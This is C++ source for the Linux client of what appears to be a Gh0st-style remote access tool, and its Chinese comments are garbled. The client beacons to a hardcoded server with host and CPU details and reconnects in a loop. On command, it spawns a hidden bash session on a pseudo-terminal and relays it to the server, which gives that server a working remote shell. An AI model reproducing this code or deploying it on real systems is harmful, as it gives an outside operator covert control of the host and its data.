#include "common/commands.h"
#include "client/IOCPClient.h"
#include <unistd.h>
#include <sys/utsname.h>
#include <string.h>
#include <termios.h>
#include <thread>
#include <fcntl.h>
#include <atomic>
#include <pty.h>
#include <iostream>
#include <mutex>
#include <stdexcept>
#include <cstdio>
#include <memory>
#include <array>
#include <regex>
#include <fstream>

int DataProcess(void* user, PBYTE szBuffer, ULONG ulLength);

// 杩滅▼鍦板潃锛氬綋鍓嶄负鍐欐鐘舵€侊紝濡傞渶璋冭瘯锛岃鎸夊疄闄呮儏鍐典慨鏀?
CONNECT_ADDRESS g_SETTINGS = {FLAG_GHOST, "192.168.0.92", "6543", CLIENT_TYPE_LINUX};

// 鍏ㄥ眬鐘舵€?
State g_bExit = S_CLIENT_NORMAL;

// 浼粓绔鐞嗙被锛氱户鎵胯嚜IOCPManager.
class PTYHandler : public IOCPManager
{
public:
    PTYHandler(IOCPClient *client) : m_client(client), m_running(false)
    {
        if (!client) {
            throw std::invalid_argument("IOCPClient pointer cannot be null");
        }

        // 鍒涘缓浼粓绔?
        if (openpty(&m_master_fd, &m_slave_fd, nullptr, nullptr, nullptr) == -1) {
            throw std::runtime_error("Failed to create pseudo terminal");
        }

        // 璁剧疆浼粓绔负闈為樆濉炴ā寮?
        int flags = fcntl(m_master_fd, F_GETFL, 0);
        fcntl(m_master_fd, F_SETFL, flags | O_NONBLOCK);

        // 鍚姩 Shell 杩涚▼
        startShell();
    }

    ~PTYHandler()
    {
        m_running = false;
        if (m_readThread.joinable()) m_readThread.join();
        close(m_master_fd);
        close(m_slave_fd);
    }

    // 鍚姩璇诲彇绾跨▼
    void Start()
    {
        if (m_running) return;
        m_running = true;
        m_readThread = std::thread(&PTYHandler::readFromPTY, this);
    }

    virtual VOID OnReceive(PBYTE data, ULONG size)
    {
        if (size && data[0] == COMMAND_NEXT) {
            Start();
            return;
        }
        std::string s((char*)data, size);
        Mprintf(s.c_str());
        std::lock_guard<std::mutex> lock(m_mutex);
        if (size > 0) {
            write(m_master_fd, (char*)data, size);
        }
    }
private:
    int m_master_fd, m_slave_fd;
    IOCPClient *m_client;
    std::thread m_readThread;
    std::atomic<bool> m_running;
    std::mutex m_mutex;
    pid_t m_child_pid;

    void startShell()
    {
        m_child_pid = fork();
        if (m_child_pid == 0) {  // 瀛愯繘绋?
            setsid();  // 鍒涘缓鏂扮殑浼氳瘽
            dup2(m_slave_fd, STDIN_FILENO);
            dup2(m_slave_fd, STDOUT_FILENO);
            dup2(m_slave_fd, STDERR_FILENO);
            close(m_master_fd);
            close(m_slave_fd);

            // 鍏抽棴鍥炴樉銆佺鐢?ANSI 棰滆壊銆佸叧闂?PS1
            const char* shell_cmd =
                "stty -echo -icanon; "  // 绂佺敤鍥炴樉鍜岃鑼冩ā寮?
                "export TERM=dumb; "    // 璁剧疆缁堢绫诲瀷涓?dumb
                "export LS_COLORS=''; " // 绂佺敤棰滆壊
                "export PS1='>'; "      // 璁剧疆鎻愮ず绗?
                //"clear; "             // 娓呯┖缁堢
                "exec /bin/bash --norc --noprofile -i";  // 鍚姩 Bash
            execl("/bin/bash", "/bin/bash", "-c", shell_cmd, nullptr);
            exit(1);
        }
    }

    void readFromPTY()
    {
        char buffer[4096];
        while (m_running) {
            ssize_t bytes_read = 0;
            {
                std::lock_guard<std::mutex> lock(m_mutex);
                bytes_read = read(m_master_fd, buffer, sizeof(buffer));
            }
            if (bytes_read > 0) {
                if (m_client) {
                    buffer[bytes_read] = 0;
                    Mprintf(buffer);
                    m_client->Send2Server(buffer, bytes_read);
                }
            } else if (bytes_read == -1) {
                usleep(10000);
            }
        }
    }
};

void *ShellworkingThread(void *param)
{
    IOCPClient  *ClientObject = new IOCPClient(g_bExit, true);
    Mprintf(">>> Enter ShellworkingThread [%p]\n", ClientObject);
    if ( !g_bExit && ClientObject->ConnectServer(g_SETTINGS.ServerIP(), g_SETTINGS.ServerPort())) {
        PTYHandler *handler=new PTYHandler(ClientObject);
        ClientObject->setManagerCallBack(handler, IOCPManager::DataProcess);
        BYTE bToken = TOKEN_SHELL_START;
        ClientObject->Send2Server((char*)&bToken, 1);
        Mprintf(">>> ShellworkingThread [%p] Send: TOKEN_SHELL_START\n", ClientObject);
        while (ClientObject->IsRunning() && ClientObject->IsConnected() && S_CLIENT_NORMAL==g_bExit)
            Sleep(1000);

        delete handler;
    }
    delete ClientObject;
    Mprintf(">>> Leave ShellworkingThread [%p]\n", ClientObject);
    return NULL;
}

int DataProcess(void* user, PBYTE szBuffer, ULONG ulLength)
{
    if (szBuffer==nullptr || ulLength ==0)
        return TRUE;

    if (szBuffer[0] == COMMAND_BYE) {
        Mprintf("*** [%p] Received Bye-Bye command ***\n", user);
        g_bExit = S_CLIENT_EXIT;
    } else if (szBuffer[0] == COMMAND_SHELL) {
        pthread_t id = 0;
        HANDLE m_hWorkThread = (HANDLE)pthread_create(&id, nullptr, ShellworkingThread, nullptr);
        Mprintf("** [%p] Received 'SHELL' command ***\n", user);
    } else if (szBuffer[0]==COMMAND_NEXT) {
        Mprintf("** [%p] Received 'NEXT' command ***\n", user);
    } else {
        Mprintf("** [%p] Received unimplemented command: %d ***\n", user, int(szBuffer[0]));
    }
    return TRUE;
}

// 鏂规硶1: 瑙ｆ瀽 lscpu 鍛戒护锛堜紭鍏堜娇鐢級
double parse_lscpu()
{
    std::array<char, 128> buffer;
    std::string result;
    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen("lscpu", "r"), pclose);
    if (!pipe) return -1.0;

    while (fgets(buffer.data(), buffer.size(), pipe.get())) {
        result += buffer.data();
    }

    // 鍖归厤 "Model name" 涓殑棰戠巼锛堝 "Intel(R) Core(TM) i5-6300HQ CPU @ 2.30GHz"锛?
    std::regex model_regex("@ ([0-9.]+)GHz");
    std::smatch match;
    if (std::regex_search(result, match, model_regex) && match.size() > 1) {
        return std::stod(match[1].str()) * 1000; // GHz -> MHz
    }
    return -1;
}

// 鏂规硶2: 瑙ｆ瀽 /proc/cpuinfo锛堝鐢級
double parse_cpuinfo()
{
    std::ifstream cpuinfo("/proc/cpuinfo");
    std::string line;
    std::regex freq_regex("@ ([0-9.]+)GHz");

    while (std::getline(cpuinfo, line)) {
        if (line.find("model name") != std::string::npos) {
            std::smatch match;
            if (std::regex_search(line, match, freq_regex) && match.size() > 1) {
                return std::stod(match[1].str()) * 1000; // GHz -> MHz
            }
        }
    }
    return -1;
}

// 涓€涓熀浜嶭inux鎿嶄綔绯荤粺瀹炵幇鐨勫彈鎺х▼搴忎緥瀛? 褰撳墠鍙疄鐜颁簡娉ㄥ唽銆佸垹闄ゅ拰缁堢鍔熻兘.
int main()
{
    char hostname[256]= {};
    if (gethostname(hostname, sizeof(hostname)) == 0) {
        std::cout << "Hostname: " << hostname << std::endl;
    } else {
        std::cerr << "Failed to get hostname" << std::endl;
    }
    struct utsname systemInfo= {};
    if (uname(&systemInfo) == 0) {
        std::cout << "System Name: " << systemInfo.sysname << std::endl;
    } else {
        std::cerr << "Failed to get system info" << std::endl;
    }

    LOGIN_INFOR logInfo;
    strcpy(logInfo.szPCName, hostname);
    strcpy(logInfo.OsVerInfoEx, systemInfo.sysname);
    strcpy(logInfo.szStartTime, ToPekingTimeAsString(nullptr).c_str());
    double freq = parse_lscpu(); // 浼樺厛浣跨敤 lscpu
    if (freq < 0) freq = parse_cpuinfo(); // 鍥為€€鍒?/proc/cpuinfo
    logInfo.dwCPUMHz = freq > 0 ? static_cast<unsigned int>(freq) : 0;
    logInfo.bWebCamIsExist = 0;
    strcpy_s(logInfo.szReserved, "LNX");

    IOCPClient  *ClientObject = new IOCPClient(g_bExit, false);
    ClientObject->setManagerCallBack(NULL, DataProcess);
    while (!g_bExit) {
        clock_t c = clock();
        if (!ClientObject->ConnectServer(g_SETTINGS.ServerIP(), g_SETTINGS.ServerPort())) {
            Sleep(5000);
        }

        ClientObject->SendLoginInfo(logInfo.Speed(clock()-c));

        do {
            Sleep(5000);
        } while (ClientObject->IsRunning() && ClientObject->IsConnected() && S_CLIENT_NORMAL==g_bExit);
    }

    delete ClientObject;

    return 0;
}
